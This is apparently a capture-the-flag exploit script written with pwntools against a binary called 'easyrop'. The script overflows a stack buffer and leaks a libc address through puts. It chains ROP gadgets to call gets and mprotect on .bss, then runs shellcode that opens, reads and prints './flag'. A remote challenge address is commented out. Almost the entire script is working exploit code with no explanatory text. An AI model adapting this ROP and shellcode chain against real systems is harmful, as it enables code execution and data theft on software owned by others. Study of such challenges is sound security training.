from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"
context.arch = 'amd64'
elf = ELF("./easyrop")
p = process("./easyrop")

# p = remote("39.97.182.233", 31881)

# 0x0000000000401b93 : pop rdi ; ret
# 0x0000000000023e6a : pop rsi ; ret
# 0x0000000000001b96 : pop rdx ; ret
# 0x000000000002e786 : jmp rdi
poprdi = 0x0000000000401b93
poprsi = 0x0000000000023e6a
poprdx = 0x0000000000001b96
jmprdi = 0x000000000002e786
# gdb.attach(p, "b *0x6030c0")


p.recvuntil('>> ') # 
payload = 'a' * 0x418 # before rbp
payload += p8(0x28) # fake counter
payload += p64(0x401b93) # pop rdi;ret
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(0x4019f3) # main
p.sendline(payload)

libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - libc.symbols['puts']

# print hex(libc.address)

bss = 0x6030c0
payload = 'a' * 0x418 # before rbp
payload += p8(0x28) # fake counter
payload += p64(poprdi) + p64(bss)
payload += p64(libc.symbols['gets'])
payload += p64(poprdi) + p64(bss & 0xfffffffffffff000)
payload += p64(libc.address + poprsi) + p64(0x1000)
payload += p64(libc.address + poprdx) + p64(0x7)
payload += p64(libc.symbols['mprotect'])
# payload += p64(libc.address + jmprdi)
payload += p64(bss)

# >>> "./flag"[::-1].ljust(8,"\x00").encode("hex")
# '67616c662f2e0000'
shellcode = asm('''
	mov rax, 0x67616c662f2e
	push rax
	mov rdi, rsp
	xor rsi, rsi
	mov rax, 2
	syscall

	mov rdi, rax
	mov rsi, rsp
	mov rdx, 0x20
	mov rax, 0
	syscall

	mov rdi, 1
	mov rax, 1
	syscall
	'''
)
# int mprotect(const void *start, size_t len, int prot);

p.sendline(payload)

from time import sleep

sleep(0.1)
p.sendline(shellcode)

p.interactive()

